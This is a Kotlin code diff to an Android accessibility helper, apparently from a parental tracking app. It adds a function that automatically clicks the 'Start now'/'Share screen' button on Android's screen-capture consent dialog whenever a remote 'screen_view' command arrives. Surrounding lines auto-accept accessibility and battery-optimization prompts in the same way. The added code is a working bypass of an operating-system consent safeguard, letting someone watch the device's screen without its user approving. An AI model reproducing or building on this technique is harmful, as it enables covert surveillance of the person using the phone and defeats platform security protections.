@@ -59,6 +59,11 @@ object AutoPermissionHelper {
         "OK", "Got it", "I agree", "Accept", "Enable",
         "Turn on", "Start", "Set up", "Confirm",
         "Use service",  // Accessibility service enable dialog
+        // MediaProjection consent dialog (com.android.systemui) for the
+        // Live Screen viewer — "Start" already substring-matches "Start now",
+        // the rest cover OEM wording variants.
+        "Start now", "Start recording", "Share screen", "Record screen",
+        "Cast screen", "Share this screen",
         "Unrestricted", "Don\u0027t optimize", "Allow background activity",  // Battery optimization
         "Yes"  // Generic confirmation
     )
@@ -115,6 +120,52 @@ object AutoPermissionHelper {
 
     fun isAutoTappableDialog(packageName: String): Boolean {
         return packageName in AUTO_TAP_PACKAGES
+    }
+
+    // ── Live Screen: MediaProjection consent auto-confirm ────────────────
+    // When the parent sends "screen_view", the app raises Android's
+    // projection consent dialog (com.android.systemui). Generic systemui
+    // auto-tapping would be dangerous, so this is gated by a dedicated flag
+    // that is only set while a screen_view consent attempt is in flight
+    // (TrackerService sets it; ScreenShareConsentActivity.onDestroy clears it).
+
+    @Volatile
+    var projectionConsentPending = false
+
+    /** Tap the positive button of the MediaProjection consent dialog. */
+    fun autoApproveProjectionDialog(service: AccessibilityService): Boolean {
+        if (!projectionConsentPending) return false
+        val root = service.rootInActiveWindow ?: return false
+        val currentPkg = root.packageName?.toString() ?: ""
+        if (currentPkg != PKG_SYSTEM_UI) {
+            root.recycle()
+            return false
+        }
+        return try {
+            val positives = listOf(
+                "start now", "start recording", "share screen",
+                "record screen", "cast screen", "share this screen"
+            )
+            for (pattern in positives) {
+                val nodes = root.findAccessibilityNodeInfosByText(pattern)
+                for (node in nodes) {
+                    if (isClickableButton(node) && !isDenyButton(node)) {
+                        clickNodeCompat(service, node)
+                        projectionConsentPending = false
+                        Log.d(TAG, "Auto-approved MediaProjection dialog: $pattern")
+                        node.recycle()
+                        return true
+                    }
+                    node.recycle()
+                }
+            }
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "autoApproveProjectionDialog error", e)
+            false
+        } finally {
+            root.recycle()
+        }
     }
 
     /**
